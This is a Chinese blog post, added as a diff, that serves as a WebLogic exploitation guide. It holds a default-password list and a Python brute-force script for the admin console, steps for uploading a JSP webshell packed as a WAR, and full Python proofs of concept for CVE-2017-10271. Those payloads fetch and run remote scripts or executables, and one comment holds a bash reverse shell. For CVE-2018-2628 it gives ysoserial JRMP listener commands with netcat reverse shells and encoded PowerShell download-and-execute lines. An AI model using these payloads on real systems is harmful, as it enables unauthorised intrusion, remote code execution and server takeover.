@@ -1,0 +1,326 @@
+---
+layout: post
+cover: 'assets/images/cover3.jpg'
+title: weblogic漏洞利用
+date:   2018-07-02
+tags: web
+subclass: 'post'
+navigation: True
+logo: 'assets/images/ghost.png'
+---
+
+### 0x00 环境搭建
+
+weblogic下载地址：
+
+http://www.oracle.com/technetwork/middleware/weblogic/downloads/index.html
+
+选择Generic Installer (800MB)，选Quick Installer无法弹出配置界面
+
+使用jdk的目录安装：
+
+```
+"C:\Program Files\Java\jdk1.8.0_161\bin\java.exe" -jar fmw_12.2.1.3.0_wls_quick.jar
+```
+
+启动服务：
+
+```
+C:\weblogic\user_projects\domains\base_domain\startWebLogic.cmd
+```
+
+等到提示`<Server state changed to RUNNING.>`
+
+登录web控制页面：`http://localhost:7001/console`
+
+### 0x01 weblogic弱口令爆破
+
+后台登录地址：
+
+`http://<ip>:7001/console/login/LoginForm.jsp`
+
+
+常见弱口令：
+
+- system:password
+- weblogic:weblogic
+- admin:security
+- joe:password
+- mary:password
+- system:security
+- wlcsystem:wlcsystem
+- wlpisystem:wlpisystem
+
+
+弱口令爆破的python脚本：
+
+```
+import requests
+
+class WebLogic:
+    def __init__(self, url):
+        if '://' not in url:
+            url = 'http://' + url
+        self.url = url.strip('/')
+    def weakPasswd(self):
+        """weak password"""
+
+        pwddict = ['WebLogic', 'weblogic', 'Oracle@123', 'password', 'system', 'Administrator', 'admin', 'security', 'joe', 'wlcsystem', 'wlpisystem']
+        for user in pwddict:
+            for pwd in pwddict:
+                data = {
+                    'j_username':user,
+                    'j_password':pwd,
+                    'j_character_encoding':'UTF-8'
+                }
+                req = requests.post(self.url+':7001/console/j_security_check', data=data, allow_redirects=False, verify=False)
+
+                if req.status_code == 302 and 'console' in req.text and 'LoginForm.jsp' not in req.text:
+                    print('[+] WebLogic username: '+user+'  password: '+pwd)
+
+if __name__ == '__main__':
+    url = '192.168.1.1'
+    wls = WebLogic(url)
+    wls.weakPasswd()
+```
+
+### 0x02 weblogic后台提权
+
+#### (1)将大马封装成war包
+
+大马`1.jsp`位于目录test中，生成test.war的命令如下：
+
+```
+jar -cvf test.war ./test/*
+```
+
+#### (2)上传大马
+
+登陆weblogic后台`http://<ip>:7001/console`，点击左侧的`部署`，在弹出来的右侧页面点击`安装`
+
+在安装页面选择`上载文件`,将打包好的包含大马的war包上传至服务器
+
+大马保存到路径为:`/root/Oracle/Middleware/user_projects/domains/weblogic/servers/AdminServer/upload`
+
+#### (3)访问大马
+
+`http://<ip>:7001/test/1.jsp`
+
+### 0x03 weblogic XMLDecoder 反序列化漏洞(CVE-2017-10271)
+
+影响版本：
+
+- WebLogic 10.3.6.0.0
+- WebLogic 12.1.3.0.0
+- WebLogic 12.2.1.1.0
+- WebLogic 12.2.1.2.0
+
+针对Linux系统weblogic的远程下载执行POC：
+
+```
+import requests
+
+class WebLogic:
+    def __init__(self, url):
+        if '://' not in url:
+            url = 'http://' + url
+        self.url = url.strip('/')
+
+    def xmlDecoder(self):
+        """Version:10.3.6.0.0/12.1.3.0.0/12.2.1.1.0
+        CVE-2017-10271
+        """
+        headers = {
+            "Content-Type":"text/xml;charset=UTF-8",
+            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
+        }
+
+        # <string>bash -i &gt;&amp; /dev/tcp/192.168.1.133/4444 0&gt;&amp;1</string>
+        xml = """
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> 
+            <soapenv:Header>
+                <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+                    <java version="1.4.0" class="java.beans.XMLDecoder">
+                        <void class="java.lang.ProcessBuilder">
+                            <array class="java.lang.String" length="3">
+                                <void index="0">
+                                    <string>/bin/bash</string>
+                                </void>
+                                <void index="1">
+                                    <string>-c</string>
+                                </void>
+                                <void index="2">
+                                	<string>wget http://******/xxx | /bin/bash xxx</string>
+                                </void>
+                            </array>
+                        <void method="start"/></void>
+                    </java>
+                </work:WorkContext>
+            </soapenv:Header>
+        <soapenv:Body/>
+        </soapenv:Envelope>"""
+        req = requests.post(self.url+":7001/wls-wsat/CoordinatorPortType", headers=headers, data=xml)
+        if req.status_code == 500 :
+            print('[+] WebLogic xml decoder ')
+            # print(req.text)
+
+if __name__ == '__main__':
+    url = '192.168.136.130'
+    wls = WebLogic(url)
+    wls.xmlDecoder()
+```
+
+针对Windows系统weblogic的远程下载执行POC：
+
+```
+import requests
+
+class WebLogic:
+    def __init__(self, url):
+        if '://' not in url:
+            url = 'http://' + url
+        self.url = url.strip('/')
+
+    def xmlDecoder(self):
+        """Version:10.3.6.0.0/12.1.3.0.0/12.2.1.1.0
+        CVE-2017-10271
+        """
+        headers = {
+            "Content-Type":"text/xml;charset=UTF-8",
+            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
+        }
+
+        # <string>bash -i &gt;&amp; /dev/tcp/192.168.1.133/4444 0&gt;&amp;1</string>
+        xml = """
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> 
+            <soapenv:Header>
+                <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+                    <java version="1.4.0" class="java.beans.XMLDecoder">
+                        <void class="java.lang.ProcessBuilder">
+                            <array class="java.lang.String" length="3">
+                                <void index="0"> 
+                                	<string>powershell</string>
+                                </void>
+                                <void index="1">
+                                	<string>-Command</string>
+                                </void>
+                                <void index="2">
+                                	<string>(New-Object System.Net.WebClient).DownloadFile('http://******/***.exe','***.exe');(New-Object -com Shell.Application).ShellExecute('***.exe');</string>
+								</void>
+                            </array>
+                        <void method="start"/></void>
+                    </java>
+                </work:WorkContext>
+            </soapenv:Header>
+        <soapenv:Body/>
+        </soapenv:Envelope>"""
+        req = requests.post(self.url+":7001/wls-wsat/CoordinatorPortType", headers=headers, data=xml)
+        if req.status_code == 500 :
+            print('[+] WebLogic xml decoder ')
+            # print(req.text)
+
+if __name__ == '__main__':
+    url = '192.168.136.130'
+    wls = WebLogic(url)
+    wls.xmlDecoder()
+```
+
+### 0x04 WebLogic反序列化漏洞(CVE-2018-2628)
+
+影响版本：
+
+- WebLogic 10.3.6.0.0
+- WebLogic 12.1.3.0.0
+- WebLogic 12.2.1.2
+- WebLogic 12.2.1.3
+
+### 针对Linux系统weblogic：
+
+#### 1、监听本地6666端口
+
+```
+nc -lvvp 6666
+```
+
+#### 2、搭建JRMPListener，用于发送payload
+
+本地ip为192.168.62.140
+
+ysoserial-master.jar的下载地址：
+
+https://jitpack.io/com/github/frohoff/ysoserial/master/ysoserial-master.jar
+
+定位到文件ysoserial-master.jar的目录
+
+```
+java -cp ysoserial-master.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'nc -nv 192.168.62.140 6666'
+```
+
+#### 3、生成JRMPClient修改poc
+
+本地ip为192.168.62.140
+
+```
+java -jar ysoserial-master.jar JRMPClient "192.168.62.140:1099" > p.dat
+cat p.dat  | xxd -ps | tr -d "\n"
+```
+
+将回显的内容替换python脚本里面的payload
+
+#### 4、、执行测试脚本
+
+https://github.com/shengqi158/CVE-2018-2628/blob/master/weblogic_poc.client1.for.scan-cve-2018-2628.py
+
+修改python脚本里面的dip
+
+执行python脚本：
+
+```
+python CVE-2018-2628.py
+```
+
+### 针对Windows系统weblogic：
+
+#### 1、搭建JRMPListener，用于发送payload
+
+对下载执行的powershell代码作base64加密，powershell实现代码如下:
+
+```
+$fileContent = "(new-object System.Net.WebClient).DownloadFile('http://******/***.exe','***.exe');start-process '***.exe'"
+$bytes  = [System.Text.Encoding]::Unicode.GetBytes($fileContent);
+$encoded = [System.Convert]::ToBase64String($bytes); 
+$encoded
+```
+
+将输出的内容替换下面代码中的`****`:
+
+定位到文件ysoserial-master.jar的目录
+
+```
+java -cp ysoserial-master.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'powershell.exe -enc ****'
+```
+
+#### 2、生成JRMPClient
+
+本地ip为192.168.62.140
+
+```
+java -jar ysoserial-master.jar JRMPClient "192.168.62.140:1099" > p.dat
+cat p.dat  | xxd -ps | tr -d "\n"
+```
+
+得到结果替换python脚本里面的payload
+
+#### 3、、执行测试脚本
+
+https://github.com/shengqi158/CVE-2018-2628/blob/master/weblogic_poc.client1.for.scan-cve-2018-2628.py
+
+修改python脚本里面的dip
+
+执行python脚本：
+
+```
+python CVE-2018-2628.py
+```
+
+
